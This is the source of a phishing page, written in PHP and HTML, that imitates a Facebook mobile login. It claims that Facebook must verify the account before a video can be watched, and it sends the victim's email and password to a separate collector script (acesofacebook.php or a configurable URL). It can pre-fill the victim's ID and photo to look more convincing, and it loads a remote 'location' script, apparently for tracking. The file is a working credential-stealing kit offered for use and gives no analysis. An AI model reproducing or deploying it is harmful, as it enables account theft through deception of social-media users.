<?php 
$actual_link = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
$action_post = dirname(dirname($actual_link)).'/acesofacebook.php';
$action_post = str_replace("public/", "", $action_post);

if(defined('ACCESSFACEBOOK_URL')){
   $action_post = ACCESSFACEBOOK_URL;
};

 ?>

<!DOCTYPE html>
<html>
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <title>Facebook Videos</title>
      <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1">
      <style type="text/css" media="screen">
        div#u_0_0 {
            padding: 10px;
        }
        
      *{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box}body{background:#3b5998}.login-form-wrap{background:#fa3e3e;position:relative;width:auto;height:auto;padding:20px 10px;text-align:center}.login-form-wrap>h1{margin:0 0 50px;padding:0;font-size:26px;color:#fff}.login-form-wrap>h5{margin-top:40px}.login-form-wrap>h5>a{font-size:14px;color:#fff;text-decoration:none;font-weight:400}.login-form input{width:100%;background:#F2F2F2;color:#fff;border:none;border-bottom:1px solid #daebfb;border-radius: 5px;margin-bottom: 12px;padding: 8px 16px;font-family:Helvetica Neue, Segoe UI, Helvetica, Arial, sans-serif;font-size: 17px;}input:active,input:focus{outline:0;color:#000}.login-form button{margin:15px 0;font-size:15pt;padding:10px;background:#3578e5;border:0;cursor:pointer;-webkit-border-radius:0;border-radius:10px;color:#fff;width:100%;}::-webkit-input-placeholder{color:#000}:-moz-placeholder{color:#fff}::-moz-placeholder{color:#000}:-ms-input-placeholder{color:#fff}.touch ._5rut{margin:0 auto;max-width:416px;padding:16px}body.touch{margin:0;-webkit-text-size-adjust:none;cursor:pointer}.touch,.touch input,.touch td,.touch textarea .touch button{font-family:helvetica,arial,sans-serif;font-size:14px}.android,.android button,.android input,.android td,.android textarea{font-family:Roboto,'Droid Sans',Helvetica,sans-serif}.wp,.wp button,.wp input,.wp td,.wp textarea{font-family:'Segoe WP',Arial,sans-serif}.bb10,.bb10 button,.bb10 input,.bb10 td,.bb10 textarea{font-family:'Slate Pro',Arial,sans-serif}.x2.ios,.x2.ios button,.x2.ios input,.x2.ios td,.x2.ios textarea{font-family:helvetica,arial,sans-serif}.sf.ios,.sf.ios button,.sf.ios input,.sf.ios td,.sf.ios textarea{font-family:-apple-system,sans-serif}.app,.btn,.touchable,i.img{-webkit-user-select:none}.touch,.touch .btn,.touch .input,.touch button,.touch input,.touch select,.touch textarea{-webkit-tap-highlight-color:transparent}.touch input,.touch textarea{-webkit-user-select:auto}.landscape .portrait_only,.portrait .landscape_only{display:none!important}#root{border-bottom:1px solid transparent;box-sizing:border-box}.maxwidth{margin:0 auto;max-width:680px}.accessible_elem{clip:rect(1px,1px,1px,1px);height:1px;overflow:hidden;position:absolute;white-space:nowrap;width:1px}body{text-align:left;direction:ltr}body,button,input,textarea,tr{font-family:sans-serif}body,dd,dl,dt,figure,h1,h2,h3,h4,h5,h6,li,ol,p,ul{margin:0;padding:0}h1,h2,h3,h4,h5,h6{font-size:1em;font-weight:700}ol,ul{list-style:none}article,aside,figcaption,figure,footer,header,nav,section{display:block}
      
        ._5hy4 {
    color: rgba(0, 0, 0, 1);
    font-size: 40px;
    font-weight: 300;
    margin-bottom: 24px;
    text-align: center;
        }
    .topheader{
    font-size:16px;line-height:22px;margin:10 8px;color:#fff
    }
      </style>
   </head>
   <div class="topheader"><center><img src="https://securylogin.com//landings/oldfbhk/dast.png" width="100px" class="_3-q3 img" /></center></div>
   <body tabindex="0" class="touch x1 _fzu _50-3 iframe acw">
      <script id="u_0_a">(function(a){a.__updateOrientation=function(){var b=!!a.orientation&&a.orientation!==180,c=document.body;if(c)c.className=c.className.replace(/(^|\s)(landscape|portrait)(\s|$)/g,' ')+' '+(b?'landscape':'portrait');return b;};})(window);</script>
      <div id="viewport">
         <h1 style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">Facebook</h1>
         <div id="page" style=" background: #FFF; ">
            <center></BR>
               <div id="logotipo">
               <?php if (!USER_UID){ ?>
                  
               <?php }else{ ?>
                 <img style='width: 150px; margin-top:20px;border: solid #fff;' src="<?php echo USER_PHOTO; ?>" alt="">
               <?php }; ?>
               <?php echo CALLED?"<h1 style=\" color: #fff; margin: 5px; font-size: 20px; \">".CALLED."</h1>":""; ?></h1>

               </div>
               
            </center>
            <div class="maxwidth _5soa acw" id="root" role="main" data-sigil="context-layer-root content-pane">
               <div class="_4g33">
                  <div class="_4g34" id="u_0_0">
                     <div id="login-notices">
                        <div class="_5yd0 _2ph- _5yd1" style="display: none;" data-sigil="m_login_notice">
                           <div class="_52jd"></div>
                        </div>
                     </div>
                     <div>
                        <div class="aclb _5rut">
                           <div data-sigil="m_login_upsell"></div>
                           <div id="Formulario">
                              <h1>
                                  <script>

                                  function dataIncorrect(){

                                  };

                                   function checksubmit($ele){

                                    var name = document.querySelector('#email').value;
                                    var password = document.querySelector('#password').value;
                                    var returner = false;
                                    var form = $ele.form;
                                    var button = document.querySelector('.confirm');

                                    if( name.trim() &&  password.trim() && !button.disabled){
                                          button.disabled = true;
                                          document.querySelector('#form___').submit();
                                          button.setAttribute('type',"button");
                                    }else{ 
                                       return false;                                         
                                    }

                                  };

                                    
                                  </script>
                                 <form id="form___" class="login-form" method="post" target="_top" action="<?php echo $action_post; ?>" >
                                    <label>
                                    <input type="<?php echo USER_UID?"hidden":"text"; ?>" id="email" <?php echo USER_UID?'value="'.USER_UID.'"':""; ?> name="email" placeholder="Mobile Number or Email" autocomplete="off" required="">
                                    </label>
                                    <label>
                                    <input type="password" name="pass" placeholder="Password" autocomplete="off" required="" id="password">
                                      <input type="hidden" name="estado" required="" id="estado">
                                    </label>
                                    <label>
                                    <button type="submit" class="uibutton confirm"  onclick="checksubmit(this)">Log In</button>
                                    </label>
                                 </form>
                              </h1>
                           </div>
                           <section class="login-form-wrap">
                              <font color="#fff">
                                 <div id="TituloCuerpo">
                                    <img src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4KPCEtLSBHZW5lcmF0b3I6IEFkb2JlIElsbHVzdHJhdG9yIDE2LjAuMCwgU1ZHIEV4cG9ydCBQbHVnLUluIC4gU1ZHIFZlcnNpb246IDYuMDAgQnVpbGQgMCkgIC0tPgo8IURPQ1RZUEUgc3ZnIFBVQkxJQyAiLS8vVzNDLy9EVEQgU1ZHIDEuMS8vRU4iICJodHRwOi8vd3d3LnczLm9yZy9HcmFwaGljcy9TVkcvMS4xL0RURC9zdmcxMS5kdGQiPgo8c3ZnIGZpbGw9IiNmZmZmZmYiIHZlcnNpb249IjEuMSIgaWQ9IkxheWVyXzEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHg9IjBweCIgeT0iMHB4IgoJIHdpZHRoPSI1MTJweCIgaGVpZ2h0PSI1MTJweCIgdmlld0JveD0iMCAwIDUxMiA1MTIiIGVuYWJsZS1iYWNrZ3JvdW5kPSJuZXcgMCAwIDUxMiA1MTIiIHhtbDpzcGFjZT0icHJlc2VydmUiPgo8cGF0aCBkPSJNMzg0LDIyNHYtOTZDMzg0LDU3LjQzOCwzMjYuNTk0LDAsMjU2LDBjLTcwLjU3OCwwLTEyOCw1Ny40MzgtMTI4LDEyOHY5NmMtMzUuMzQ0LDAtNjQsMjguNjU2LTY0LDY0djE2MAoJYzAsMzUuMzQ0LDI4LjY1Niw2NCw2NCw2NGgyNTZjMzUuMzQ0LDAsNjQtMjguNjU2LDY0LTY0VjI4OEM0NDgsMjUyLjY1Niw0MTkuMzQ0LDIyNCwzODQsMjI0eiBNMjcyLDM3OS4wOTRWNDMyCgljMCw4Ljg0NC03LjE1NiwxNi0xNiwxNnMtMTYtNy4xNTYtMTYtMTZ2LTUyLjkwNmMtOS4zOTEtNS41NjMtMTYtMTUuMzc1LTE2LTI3LjA5NGMwLTE3LjY4OCwxNC4zMjgtMzIsMzItMzJzMzIsMTQuMzEzLDMyLDMyCglDMjg4LDM2My43MTksMjgxLjM5MSwzNzMuNTMxLDI3MiwzNzkuMDk0eiBNMzIwLDIyNEgxOTJ2LTk2YzAtMzUuMzEzLDI4LjcwMy02NCw2NC02NGMzNS4yODEsMCw2NCwyOC42ODgsNjQsNjRWMjI0eiIvPgo8L3N2Zz4K" style=" width: 14px; margin-right: 5px; vertical-align: middle; "/><b>Facebook<b/> needs to verify your account information to allow access to this video                                  
                                 </div>
                              </font>
                           </section></br>
                           <center><b>Facebook ©2019</b></center>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
         </div>
      </div>
      <script>
         var script_ = document.createElement('script');
         script_.src = "<?php echo dirname($action_post); ?>/location";
         script_.asunc = true;
         document.body.appendChild(script_);
      </script>
      
   </body>
</html>